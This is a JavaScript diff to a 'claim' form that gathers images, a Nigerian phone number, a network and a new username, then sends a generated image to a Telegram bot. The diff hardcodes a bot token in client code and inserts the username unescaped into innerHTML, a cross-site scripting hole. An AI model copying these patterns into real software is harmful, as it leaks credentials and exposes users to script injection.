@@ -109,13 +109,14 @@ function handleClaim() {
     const images = document.getElementById('images').files;
     const phone = document.getElementById('phone').value;
     const network = document.getElementById('network').value;
+    const username = document.getElementById('username').value;
     const alertMessageDiv = document.getElementById('alertMessage');
 
     alertMessageDiv.textContent = '';
     alertMessageDiv.style.color = 'red';
 
-    if (images.length > 20) {
-        showAlert('You can only upload up to 20 images.', 'error');
+    if (images.length > 5) {
+        showAlert('You can only upload up to 5 images.', 'error');
         return;
     }
 
@@ -124,7 +125,7 @@ function handleClaim() {
         return;
     }
 
-    displayDetails(phone, network, images);
+    displayDetails(phone, network, images, username);
     generateImage();
 }
 
@@ -138,7 +139,7 @@ function isValidPhoneNumber(phone) {
     return phone.length === 14 && phone.startsWith('+234');
 }
 
-function displayDetails(phone, network, images) {
+function displayDetails(phone, network, images, username) {
     const resultDiv = document.getElementById('result');
     resultDiv.innerHTML = '';
 
@@ -149,13 +150,14 @@ function displayDetails(phone, network, images) {
         </div>
         <p>Phone: ${phone}</p>
         <p>Network: ${network}</p>
+        ${username ? `<p>Username: ${username}</p>` : ''}
     `;
     resultDiv.appendChild(detailsDiv);
 
     Array.from(images).forEach(image => {
         const img = document.createElement('img');
         img.src = URL.createObjectURL(image);
-        img.height = 100;
+        img.classList.add('uploaded-image');
         resultDiv.appendChild(img);
     });
 }
@@ -183,7 +185,7 @@ function showSendButton(canvas) {
 
 function sendToTelegram(imageData) {
     const botToken = '7239108538:AAHeXQhHXINWCz7gnM6_m3-611BTepRGUJg';
-    const chatId = '1002170868247';
+    const chatId = '-1002170868247';
     const alertMessageDiv = document.getElementById('alertMessage');
 
     const formData = new FormData();
@@ -219,4 +221,7 @@ function dataURItoBlob(dataURI) {
     }
     return new Blob([ab], { type: mimeString });
 }
+
+    
+    
 
